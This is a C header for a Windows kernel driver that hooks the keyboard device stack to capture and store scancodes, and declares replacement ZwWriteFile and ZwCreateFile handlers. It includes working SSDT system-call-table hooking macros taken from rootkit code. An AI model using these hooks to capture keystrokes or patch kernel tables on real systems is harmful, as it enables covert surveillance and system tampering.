/*
 * Module: obhook.h
 * Author: Christopher Wood
 * Description: Keyboard hook header.
 * Environment: Kernel mode only
 */

#ifndef OBHOOK_H_
#define OBHOOK_H_

#include "Ntifs.h"

/* Begin HideProcessHookMDL SSDT hook code */
#pragma pack(1)
typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase;
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
       _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
/* End HideProcessHookMDL SSDT hook code */

/* Hooked ZwWriteFile function prototypes */
NTSYSAPI
NTSTATUS
NTAPI ZwWriteFile(
            IN HANDLE             FileHandle,
			IN HANDLE             Event,
			IN PIO_APC_ROUTINE    ApcRoutine,
			IN PVOID              ApcContext,
			OUT PIO_STATUS_BLOCK  IoStatusBlock,
			IN PVOID              Buffer,
			IN ULONG              Length,
			IN PLARGE_INTEGER     ByteOffset,
			IN PULONG             Key
			);

typedef NTSTATUS (*ZWWRITEFILE)(
			HANDLE             FileHandle,
			HANDLE             Event,
			PIO_APC_ROUTINE    ApcRoutine,
			PVOID              ApcContext,
			PIO_STATUS_BLOCK   IoStatusBlock,
			PVOID              Buffer,
			ULONG              Length,
			PLARGE_INTEGER     ByteOffset,
			PULONG             Key
			);

/* Hooked ZwCreateFile function prototypes */
NTSYSAPI
NTSTATUS
NTAPI ZwCreateFile(
            IN PHANDLE               FileHandle,
			IN ACCESS_MASK           DesiredAccess,
			IN POBJECT_ATTRIBUTES    ObjectAttributes,
			OUT PIO_STATUS_BLOCK     IoStatusBlock,
			__in_opt PLARGE_INTEGER  AllocationSize,
			IN ULONG                 FileAttributes,
			IN ULONG                 ShareAccess,
			IN ULONG                 CreateDisposition,
			IN ULONG                 CreateOptions,
			__in_opt PVOID           EaBuffer,
			IN ULONG                 EaLength
    );

typedef NTSTATUS (*ZWCREATEFILE)(
			PHANDLE               FileHandle,
			ACCESS_MASK           DesiredAccess,
			POBJECT_ATTRIBUTES    ObjectAttributes,
			PIO_STATUS_BLOCK      IoStatusBlock,
			PLARGE_INTEGER        AllocationSize,
			ULONG                 FileAttributes,
			ULONG                 ShareAccess,
			ULONG                 CreateDisposition,
			ULONG                 CreateOptions,
			PVOID                 EaBuffer,
			ULONG                 EaLength
			);

/* Driver routine function */
IO_COMPLETION_ROUTINE OutboundOnReadCompletionRoutine;

/* Function prototypes */

/*
 * Hook the keyboard device stack by sttacking this driver on top of it.
 *
 * @param pDriverObject -
 *
 * @return NTSTATUS
 */
NTSTATUS
OutboundHookKeyboard(IN PDRIVER_OBJECT pDriverObject);

/*
 * Custom function to handle IRPs sent to the driver from the kernel.
 * This is where any IRP preprocessing would occur.
 *
 * @param pDeviceObject - device object associated with this driver
 * @param pIrp - the IRP being passed down the stack
 *
 * @return NTSTATUS
 */
NTSTATUS
OutboundDispatchRead(
    IN PDEVICE_OBJECT  pDeviceObject,
    IN PIRP            pIrp
    );

/*
 * Function to process IRP upon completion (on it's way up the stack). This is
 * where keyboard scancode is extracted, converted, and stored for comparison
 *
 * @param pDeviceObject - device object associated with this driver
 * @param pIrp - the IRP being passed back up the stack
 * @param Context - TODO
 *
 * @return NTSTATUS
 */
NTSTATUS
OutboundOnReadCompletionRoutine(
    IN PDEVICE_OBJECT  pDeviceObject,
    IN PIRP            pIrp,
    IN PVOID           Context
    );

/*
 * TODO
 *
 * @param FileHandle - TODO
 * @param Event - TODO
 * @param ApcRoutine - TODO
 * @param ApcContext - TODO
 * @param IoStatusBlock - TODO
 * @param Buffer - TODO
 * @param Length - TODO
 * @param ByteOffset - TODO
 * @param Key - TODO
 *
 * @return NTSTATUS
 */
NTSTATUS
NewZwWriteFile(
    IN HANDLE             FileHandle,
    IN HANDLE             Event,
    IN PIO_APC_ROUTINE    ApcRoutine,
    IN PVOID              ApcContext,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN PVOID              Buffer,
    IN ULONG              Length,
    IN PLARGE_INTEGER     ByteOffset,
    IN PULONG             Key
    );

/*
 * TODO
 *
 * @param FileHandle - TODO
 * @param DesiredAccess - TODO
 * @param ObjectAttributes - TODO
 * @param IoStatusBlock - TODO
 * @param AllocationSize - TODO
 * @param FileAttributes - TODO
 * @param ShareAccess - TODO
 * @param CreateDisposition - TODO
 * @param CreateOptions - TODO
 * @param EaBuffer - TODO
 * @param EaLength - TODO
 *
 * @return NTSTATUS
 */
NTSTATUS
NewZwCreateFile(
    IN HANDLE                FileHandle,
    IN ACCESS_MASK           DesiredAccess,
    IN POBJECT_ATTRIBUTES    ObjectAttributes,
    OUT PIO_STATUS_BLOCK     IoStatusBlock,
    __in_opt PLARGE_INTEGER  AllocationSize,
    IN ULONG                 FileAttributes,
    IN ULONG                 ShareAccess,
    IN ULONG                 CreateDisposition,
    IN ULONG                 CreateOptions,
    __in_opt PVOID           EaBuffer,
    IN ULONG                 EaLength
    );

#endif
